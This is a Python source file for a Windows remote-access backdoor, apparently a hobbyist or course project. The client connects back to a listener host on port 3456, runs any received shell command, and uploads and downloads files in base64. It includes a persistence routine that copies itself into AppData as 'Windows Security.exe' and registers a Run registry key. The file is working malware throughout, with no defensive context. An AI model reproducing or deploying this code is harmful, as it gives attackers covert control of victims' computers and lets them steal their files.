#!/usr/bin/env python3

# Note:using listener like netcat face problem to run somme commands to run,,so creating our custom listener


import socket, json, base64
import subprocess, sys, os
import time
import shutil


class Backdoor:
	def __init__(self, address):
		# self.become_persistent()
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect(address)  

	def become_persistent(self):
		# Make our back door permanent
		evil_file_location = os.environ['appdata'] + "\\Windows Security.exe"  # \\ since python recognise it as \W 	specially like \n , \r
		if not os.path.exists(evil_file_location):
			shutil.copyfile(sys.executable, evil_file_location) # for python --> '__file__' , 'sys.executable' for executable
			subprocess.Popen('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell = True)

	def chat_starter(self, chat_option):
		# Just extra feature to start the chat with the machine
		if chat_option == "start":
			subprocess.call('start "HACKED" cmd /k py auto_chat_client.py', shell=True)
			return "[+]CHAT started successfully"
		else:
			return "[-] Invalid chat option"

	def reliable_send(self, data):
		# Sends data error free
		json_data = json.dumps(data)
		self.connection.send(json_data.encode())

	def reliable_receive(self):
		# receives data error free
		json_data = b""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue

	def change_working_dir(self, path):
		# Changes the working directory
		os.chdir(path)
		return ("[+]Changing working directory to " + path)

	def read_file(self, path):
		# Reads the file content
		with open(path, "rb") as file:
			return base64.b64encode(file.read()).decode()

	def write_file(self, path, content):
		# Writes the file received file content to the file
		with open(path, "wb") as file:
			file.write(base64.b64decode(content))

		return "[+] Upload successful."
		
	def execute_sys_command(self, command):
		# Executes commands on the system
		return subprocess.check_output(command, shell=True, stdin=subprocess.DEVNULL, stderr=subprocess.DEVNULL).decode()
		#'shell = True' required for running in windows , whether command is list or string

	def run(self):
		# Recognises what to do with the command received
		while True:
			command = self.reliable_receive()
			try:
				if command[0] == "exit":
					self.connection.close()
					sys.exit()
					# return "request to exit"
				elif command[0] == "cd" and len(command) > 1:
					command_result = self.change_working_dir(command[1])
				elif command[0] == "download":
					command_result = self.read_file(command[1])
				elif command[0] == "upload":
					command_result = self.write_file(command[1], command[2])
				elif command[0] == "chat":
					command_result = self.chat_starter(command[1])
				else:
					command_result = self.execute_sys_command(command)
			except Exception as error:
				command_result = "[-] >> " + str(error)
				# command_result = "[-] Error during command execution."

			self.reliable_send(command_result)
	

# main code
def reliable_connection():
	# address = socket.gethostbyname_ex(socket.gethostname()) [-1][-1]
	address = ""																	# address of the host
	port = 3456
	while True:
		try:
			ha_backdoor = Backdoor((address, port))
			ha_backdoor.run()
		except Exception as e:
			time.sleep(5)
			continue
	
reliable_connection()

